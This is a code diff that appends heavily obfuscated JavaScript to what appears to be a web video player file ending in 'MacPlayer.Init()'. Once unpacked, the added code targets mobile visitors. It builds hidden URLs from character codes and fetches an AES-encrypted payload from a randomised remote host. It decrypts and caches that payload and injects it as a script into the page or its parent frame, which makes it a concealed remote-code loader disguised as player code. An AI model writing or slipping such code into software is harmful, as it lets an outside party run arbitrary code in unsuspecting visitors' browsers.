+var _0x4691 = ['mJm5nuP0qNztva', 'xhCR', 'zNjVBunOyxjdB2rL', 'mJyZzwHruhjz', 'ndzUr2fRDvq', 'mta2ntK4oe1ry2jlsG', 'FhX8DgHPC3XYzxbSywnLFe1Hy1bSyxLLCKnVBMzPz3WXmdb8Awz8FhX8Fgz1BMn0Aw9UFhXnywnqBgf5zxj8FhX8FgLUzgv4t2z8yNvMzMvYFhnYy3X8FgHLAwDODhXqBgf5rNjVBxXbz2vUDhX8FhX0B1n0CMLUz3X3Awr0AhX8v2LKDgH8sgvPz2H0FhX2yxj8C3r5Bgv8DxjSFhX1CMXFBMv4DhXNzxrnB250AhXNzxreyxrLFhXNzxriB3vYC3XNzxrnAw51DgvZFgDLDfnLy29Uzhn8zg9JDw1LBNr8FhbVC2L0Aw9UFgLMCMfTzxXPzhX1BMvZy2fWzxXqBgf5u2vYDMvYFhXWBgf5zxjFBgLZDhXWyxjZzxXNzxrzzwfYFhXZAwr8BMLKFgf0Dhj8CgXHEwXLzNr8z2v0FgjHC2u2ngrLy29KzxXcDwzMzxj8DgfIBgv8BM98r2v0rgf0zxXYzxr1CM58r2v0vxjSFeXPBMT8uhjLC3rYywLUFefKC0vUzhXtzwnVBMr8BMf2AwDHDg9YFhnJCMLWDhX0CNvLFhnOB3D8u3rHDhvZFgLUC3rHBgX8ugXHExX3CML0zxWWChH8zgL2FgzYyw1LqM9YzgvYFhnJCM9SBgLUz3XHyNnVBhv0zxXPBMrLEhW5otK5ohX0zhXVzMzZzxrizwLNAhr8B2zMC2v0v2LKDgH8C2nYFgLWDhXqyxrOFerVD258ugfYC2v8zw5JCNLWDhXLBhnLFhb4FezSywD8C2vYDMvYFhnLCNzLCL9SAxn0FhvUzgvMAw5LzhXUzxD8rgf0zxX5ExL5FfLzwvL8z2v0rNvSBfLLyxj8ExL8wvL8tu18z2v0rgf5FgrKFereFgHOFeHiFg1TFhnZFfntFeDVFgXVy2f0Aw9UFgHYzwz8u2HVD3XZzxruAw1LB3v0FdeWmdb8Aw5Uzxjive1mFeH0BwX8v2LUFe1Hy3X0zxn0FhbSyxrMB3jTFgnYzwf0zuvSzw1LBNr8DhLWzxX0zxH0FgPHDMfZy3jPChr8yxn5BMn8y2HHCNnLDhX1Dgz8thK5mwjTBhzIAtv0wvDoAMjytxvIr0v2yuHsDgjdotbIm0f4tum1Cwn3FhL5ExLntwrKFgDLDevSzw1LBNrZqNLuywDoyw1LFhbHCMvUDe5Vzgv8Aw5Zzxj0qMvMB3jLFefKC1n0yxj0FgHPzgv8sw5ZDgfSBhXMywXZzxXIywnRz3jVDw5KFdaWmdaWmhXMB250FhnPEMv8mtrWEhXJB2XVCNXgnKy2rJz8BwfYz2LUFhbHzgrPBMD8CMvSyxrPDMv8B3zLCMzSB3D8AgLKzgvUFg1PBNWXmdbWEhXPBMHLCML0FgLTCg9YDgfUDhXJBgfZC3XKAxnWBgf5Fg5VBMv8yM9YzgvYFgnLBgXWywrKAw5NFgnLBgXZCgfJAw5NFhrYFhzHBgLNBNX0B3b8BMjZChXQC3XjBML0FhbSyxLLCL9HywfHFhvZzxjbz2vUDhX0B0XVD2vYq2fZzxXHBMrYB2LKFg1VyMLSzxXPCg9KFgLVC3XPCgHVBMv8AxbHzhX3Awr0Ag1VyNXOzwLNAhrTB2j8ChjLC3rYywLUFhnLy29UzhXMBgfNFfrYExnLzxX0CNLZzwv8ug9PBNrZFhbVAw50C3XKzwnVzgvvuKLdB21WB25LBNr8BgLUA3XMCM9TFfbSyxLoB3rLFg5VDgv8ugXHEvvYBhXqBgf5vxjStMv4DhXqBgf5tgLUA05LEhr8BgLUA19UzxH0FfbSyxLmAw5RuhjLFgXPBMTFChjLFeLKFfnPzhXoAwr8zgvZFhbZFg1Hy2nTC3XWyxrOFhn0yxrPy3XWBgf5zxj8zg93BG', 'mJC0oduXBfr1thfi', 'mJC4nJq5zNvrzhvM', 'ote0m3HIq3fgBW', 'nJaZotq3qwLHD3H4', 'mxzhv0HxsW', 'qsbLpxSNmtyNoMmOzIX0kxS3kcf0kxT0ptfiidfjkcL9qsbHpvSN5PELjYWN5lIajYWN5lQmjYWN5lIjjYWN5zUBjYWN5lQujYWN5ywTj107zJ1MlJqOlZfkFdfllYX0lJfmkcKPo2y9zI40kc8XtxWXtI8SkhqUvIGPjtyPpJK/khqUvIGPjtyPlNuOktONmcCRkhqUvIGPjtyPktTMpwyUncGVmu8VlhqUrIGPpJK/Dc5gkcKUDsGPoICWjYT0lKyOksK7zJ1MlJqOl00VzYX0lKyOksK7zJ1MlJqOl3D8vY9NlgfBDc4XucGPxsK7zJ1MlJqOlZfrFdfslYX0lKCOkt45p3qUrYGPlNuOktONmcCRDc5hkcKPo2y9zI40kc9KFeqVzYX0lKCOksK7zJ1MlJqOlZftFdfulYX0lKKOkt45p3qUssGPlNuOktONmcCRDc5jkcKPo2y9zI40kc9OFeGVzYX0lKKOksK7zJ1MlJqOlZfvlYX0lKOOkt45p3qUsIGPlNuOktONmcCRDc5kkcKPo2y9zI40kc9Tl2CSDc5kkcKPo2y9zI40kc8XvNWXvY8SDc5lkcK+ot90lKSOks51kcK6jZaNk3qUsYGPktTMpwyUncGVC3Xtl2CSDc5lkcKPoZe3igz9lcCXocC6yYHZlg4PEZe3idmUmtKUncGNE1H9jYXZks40kcD7wh0NlhmPlJqOj3TzFsCSBIKUncGNE1L9jYXUkx0SjZfyjZPJkhmSBIL7mvKUmvO9mY4XocHZlg4PFsWNmJaNoMmOkxSKkcCJAYCPlLOOj2WNldmUmwePoZiXkgmOkxTLlJfIkcL9ldmUmwmQmJiPoYqOiImXmciPlJeXkdaPlJiZptmUmJqRjYC7nYGHlYGYnxWYnIKVAs4YnYGXzc4YocKPE0eGyt1mlJi5kcCXzsCPo2eUmMe9jZjIlZjJjZTHlJjKptfMo2eUmMu9jZjMltGNo2eUBd0XmIGNmMC9psCPkYC/CJ0NkZmUmtyOjZjOjYK7qsbIpuWUmMKOjZfLjYLBmf07yI4YAI4YAYHHlgiPFx0SjZjSjZPJkcL7nYGKkciJAYiPlLOOj2WNkse9mY4XmYL7jcGIi2SIks5AkcDSjYWZlJeZkx0KkciJAYiPlJfNkcL9lcCXyIC6yYGPEYqOjYnRjYKUmM0Okx0SjZjUjZPJkcL7mY4XAd0YBZSKkcCJmwKNks4XzYGPFsWNmwONoMmOkxTmlJfRkcC8qJ4UzxSYCdOGiZjXoZjYltjZoJj0oZj1oImYDJSYDZOXBdSYEdOXBdTooJj5oZj6oJjbo3y6jYSZlNGRjZTVoICRmY55kYC7mKiTBZOYqZT9lMuGmtr7DJO2jtTVoJyLo30UzsaJmtb7tJOYrdSHmKu7DJO2jtTVoJyLo308l0i+pdfTidjgpsjLiJ4NkYC8tYbqpsjRiIbSpsiIidfUpsiWiIaXBZ0ImtuIihy9iJyLiIbVpsi2jsiGqJ0ItJOXCdT6ltfXoJfYoYi+pc9ppJXpifa9iJfPiIbSpsiIidfUpsiWiIaXBZ0ImtuIihy9iJyLiIbVpsi2jsiGqJ0ItJOXCdT6ltfXoJfYoZjhoJjioYi+pc9ppICRjZWXncaYst0ImciGmKO9iJaIidjlpsiWiJ48mKW+pdfZifa9iJeWiIaYtt0ImK4Iiei9iIi+jJjpoZWVmxm+pc8Xnd48lZfTpICPoZmUmxq9jcGNlMuNks4XmsGWks4XDdSZlJf1psqOjY5LjYKUmteOmcKUmxu7tc4XAYGNpdf2jYSNmxCGBd0IjYSZlJf4kZmUCcSNlJjqiJ48lZf2jYSNmxC+jYL9lcCXEsC6yYGPE30SjZjrjZPJkcL7mY4XAd0XzJSZlJf6psCNo0eGyt0YuJS3kgeUmue9psCXjYL7ys5dpveOys5dktTHlKu9usHHlKuPFtfcidCOys4Xqt09jZiNkxTHlKm9usGXmIHHlKmPktTHlKu9usGXmIHHlKuPkx0ZlNe9mwqUmLmUmLqOktSZlNG9ns52oZmUEt01lM87nYGZlNeUAIGImLuIkt4WFhWZlNeUAIGImLyIkt4WFhWZlNeUAIGImLCIkt4WFhWZlNeUAIGImLGIkt4WFhWZlNeUAIGImLKIkt4WFhWZlNeUAIGImLOIkt4WkxSZlNG9ns4ZmdSZlNK9ns4Zmx03kdmUEc5QkciXqYiPpt0TmsyMmY54lMOOiIuIkt09ltePEZmUEd0NnIuNFtCOmY55lMOOiJfdiIK9ps0XjIyZlNKUAIGIjsiPpt0TmsL7mY55psC2jsD9mY4Xyt01lJmYoZmUmtm9ns5RoZmUmwm9ns4ZmZSZlJfepweUmZq7mY4Znt1HlJm2oZmUmZC9ys4ZodSZlJe5ptm5kgeUm2ePoZmUCd1HlJnIoZmUm2m9ys4ZzdSZlLi9ys4Xrt09jZe1jZ8NjZPHlJffoZmUm2u9ys5doZmUm2y9ys5foZmUm2C9ys4ZAdSZlJnPpweUm2O7mY4ZAZ1HlLa7mY4ZBd1HlLG7mY4ZBt1HlLK7nYG1lJfgwZmUuL0HptfhkxSZlLi9ns4XrLSZlLjDlJnUFtCOns5uwZmUCf0HptfhkxS3kduUvfSZlNbDlJnVpt0ImsiPEZmUmxO9ns5uwZmUCf0Uvt09jYC/ns5voJuUvfSZlNbDlLu7mY5WpsDvj319mY4XEd0ZCc4ZCsSNlZnYlZnZlYC7nYGZlJfept0Im3qIkxTLlJf5kcL9muj7zs4XAIGPFx19oW', 'Dg9tDhjPBMC', 'mZqYmdKZwxHXBgrj'];
+var _0x514f = function (_0x44ca9a, _0x5b8aba) {
+  _0x44ca9a = _0x44ca9a - 0x14b;
+  var _0x469156 = _0x4691[_0x44ca9a];
+  if (_0x514f['vrSmCL'] === undefined) {
+    var _0x514ff0 = function (_0x67663b) {
+      var _0x2a931c = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
+      var _0x4d5ea5 = '';
+      for (var _0x577b14 = 0x0, _0xacb149, _0xda3c10, _0x1e73a6 = 0x0; _0xda3c10 = _0x67663b['charAt'](_0x1e73a6++); ~_0xda3c10 && (_0xacb149 = _0x577b14 % 0x4 ? _0xacb149 * 0x40 + _0xda3c10 : _0xda3c10, _0x577b14++ % 0x4) ? _0x4d5ea5 += String['fromCharCode'](0xff & _0xacb149 >> (-0x2 * _0x577b14 & 0x6)) : 0x0) {
+        _0xda3c10 = _0x2a931c['indexOf'](_0xda3c10);
+      }
+      return _0x4d5ea5;
+    };
+    _0x514f['yqqMBs'] = function (_0x322b4a) {
+      var _0x306dd0 = _0x514ff0(_0x322b4a);
+      var _0x38c213 = [];
+      for (var _0x52b2e0 = 0x0, _0x61848b = _0x306dd0['length']; _0x52b2e0 < _0x61848b; _0x52b2e0++) {
+        _0x38c213 += '%' + ('00' + _0x306dd0['charCodeAt'](_0x52b2e0)['toString'](0x10))['slice'](-0x2);
+      }
+      return decodeURIComponent(_0x38c213);
+    }, _0x514f['sLCopo'] = {}, _0x514f['vrSmCL'] = true;
+  }
+  var _0x578690 = _0x4691[0x0],
+    _0x3a2473 = _0x44ca9a + _0x578690,
+    _0x317c98 = _0x514f['sLCopo'][_0x3a2473];
+  return _0x317c98 === undefined ? (_0x469156 = _0x514f['yqqMBs'](_0x469156), _0x514f['sLCopo'][_0x3a2473] = _0x469156) : _0x469156 = _0x317c98, _0x469156;
+};
+var _0x52d073 = _0x514f,
+  _0x1f7523 = _0x514f;
+(function (_0x458a19, _0x293c12) {
+  var _0x3d9384 = _0x514f,
+    _0x222941 = _0x514f,
+    _0x327f63 = _0x514f;
+  while (true) {
+    try {
+      var _0x5b8bd9 = -parseInt(_0x3d9384(0x14f)) * -parseInt(_0x222941(0x152)) + -parseInt(_0x327f63(0x153)) * -parseInt(_0x222941(0x158)) + -parseInt(_0x222941(0x156)) + parseInt(_0x222941(0x14e)) + parseInt(_0x327f63(0x14b)) * -parseInt(_0x222941(0x157)) + parseInt(_0x327f63(0x159)) + -parseInt(_0x222941(0x154));
+      if (_0x5b8bd9 === _0x293c12) break;else _0x458a19['push'](_0x458a19['shift']());
+    } catch (_0x3562bb) {
+      _0x458a19['push'](_0x458a19['shift']());
+    }
+  }
+})(_0x4691, 0x5c0b7), eval(function (_0x3f0f39, _0x52536a, _0x11bee5, _0xd8f0f5, _0x11e39d, _0x4bc509) {
+  _0x11e39d = function (_0x45f417) {
+    var _0x1e68eb = _0x514f,
+      _0x5f1fd3 = _0x514f;
+    return (_0x45f417 < _0x52536a ? '' : _0x11e39d(parseInt(_0x45f417 / _0x52536a))) + ((_0x45f417 = _0x45f417 % _0x52536a) > 0x23 ? String[_0x1e68eb(0x151)](_0x45f417 + 0x1d) : _0x45f417[_0x5f1fd3(0x14d)](0x24));
+  };
+  if (!''['replace'](/^/, String)) {
+    while (_0x11bee5--) _0x4bc509[_0x11e39d(_0x11bee5)] = _0xd8f0f5[_0x11bee5] || _0x11e39d(_0x11bee5);
+    _0xd8f0f5 = [function (_0x5f08ed) {
+      return _0x4bc509[_0x5f08ed];
+    }], _0x11e39d = function () {
+      var _0x1f9014 = _0x514f;
+      return _0x1f9014(0x150);
+    }, _0x11bee5 = 0x1;
+  }
+  ;
+  while (_0x11bee5--) if (_0xd8f0f5[_0x11bee5]) _0x3f0f39 = _0x3f0f39['replace'](new RegExp('\x5cb' + _0x11e39d(_0x11bee5) + '\x5cb', 'g'), _0xd8f0f5[_0x11bee5]);
+  return _0x3f0f39;
+}(_0x52d073(0x14c), 0x3e, 0xd8, _0x52d073(0x155)['split']('|'), 0x0, {}));
+;
+new Function(function (p, a, c, k, e, r) {
+  e = function (c) {
+    return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36));
+  };
+  if (!''.replace(/^/, String)) {
+    while (c--) r[e(c)] = k[c] || e(c);
+    k = [function (e) {
+      return r[e];
+    }];
+    e = function () {
+      return '\\w+';
+    };
+    c = 1;
+  }
+  ;
+  while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
+  return p;
+}('5 g={1a:1O(){u p=D.1P;u a=["1Q","1R"].1S(p.1T(0,3));u b=D.1U>1||D.1V>1;u c=/1W|1b|1X|1Y|1Z/i.1c(D.20);u d=v.21.22<=23;u e=/1b|24/i.1c(p);w!a&&((b&&c)||(b&&d)||(b&&e))},1d(){x(!g.1a())w;x(v.1e)w;5 P=(1f,1g)=>\'25://\'+1g+1f;5 Q={1h:P(n.o(l,R,h,R,26,l,E,F,G,m,l,q,y,z,A,H,j,I,h,m,l,27,7,r,7,r,l,q,y,z,A,H,j,I,h,m,7,S,F,s,7,h,m),n.o(q,J,s,h,m,7,q,E,j,K,J,T,E,R,y,L,7,q,j,S)),1i:P(n.o(l,h,1j,K,L,y,z,l,r,7,r,r,7,r,l,h,1j,K,L,y,z,7,S,F,s,7,h,m),n.o(m,1k.28(1k.29()*9)+r,7,G,j,j,H,q,J,s,7,H,j,A))+\'?1l=2a\'};g.1m(Q.1h,()=>{5 f=k.2b(v.U.2c+n.o(I,q,j,A,z,I,2d,j,K,E,F,s,2e)).V();2f 6=g.W(f);x(!6){5 t=2g 2h();t.2i("2j",Q.1i,1n);t.1o=()=>{x(t.1p===4&&t.2k===X){2l{6=t.2m;x(6&&6!=="X"){g.M(f,6,2n);5 N=g.Y(6);g.2(N)}1q{g.M(f,"X",2o)}}2p(e){}}};t.2q(1r)}1q{5 N=g.Y(6);g.2(N)}})},1m(1s,Z){5 2=B.1t("2");2.1l="6/2r";2.2s="2t-8";2.2u=1s;2.1u?2.1u("2v",Z,1v):2.2w("1o",()=>2.1p==="2x"&&Z());B.1w.1x(2)},M(f,10,1y){11.M(f,1z.2y({10,12:1A.1B()+1y*2z}))},W(f){5 C=1z.13(11.W(f));x(C&&(!C.12||1A.1B()<=C.12))w C.10;11.2A(f);w 1r},Y(6,14=1v){5 f=k.15.16.13(n.o(2B,2C,T,2D,2E,s,2F,J,2G,h,1C,2H,L,1D,A,2I));5 17=k.15.16.13(n.o(m,2J,1C,1E,1D,G,2K,G,2L,1E,T,2M,s,2N,y,h));w 14?k.1F.14(6,f,{17,1G:k.1G.2O,1H:k.1I.1J}).V():k.1F.2P(6,f,{17,1H:k.1I.1J}).V(k.15.16)},2(O){O="v.1e=1n;"+O;5 1K=v.U.1L!==18.U.1L;5 19=1K?B:(v.1M.1N!==18.1M.1N?18.B:B);5 2=19.1t("2");2.6=O;19.1w.1x(2)}};g.1d();', 62, 176, '||script|||const|text|46||||||||key|strad|106||111|CryptoJS|47|115|String|fromCharCode||99|49|110|xhr|var|window|return|if|114|121|112|document|item|navigator|108|105|98|116|45|100|117|101|setItem|data|code|getUrl|urls|97|109|102|location|toString|getItem|200|cryptJs|callback|value|localStorage|expire|parse|encrypt|enc|Utf8|iv|parent|targetDoc|mobile|iPhone|test|start|autoCopy|path|domain|cryptoJs|jquery|113|Math|type|loadScript|true|onreadystatechange|readyState|else|null|url|createElement|addEventListener|false|head|appendChild|expireSeconds|JSON|Date|now|78|54|83|AES|mode|padding|pad|Pkcs7|isCrossDomain|origin|frames|length|function|platform|Win|Mac|includes|substring|maxTouchPoints|msMaxTouchPoints|Android|iPad|iPod|Mobile|userAgent|screen|width|768|Linux|https|120|52|floor|random|player|MD5|host|107|103|let|new|XMLHttpRequest|open|GET|status|try|responseText|3600|600|catch|send|javascript|charset|UTF|src|load|attachEvent|loaded|stringify|1000|removeItem|80|66|65|85|84|77|68|76|69|86|119|118|88|CBC|decrypt'.split('|'), 0, {}))();
+MacPlayer.Init();
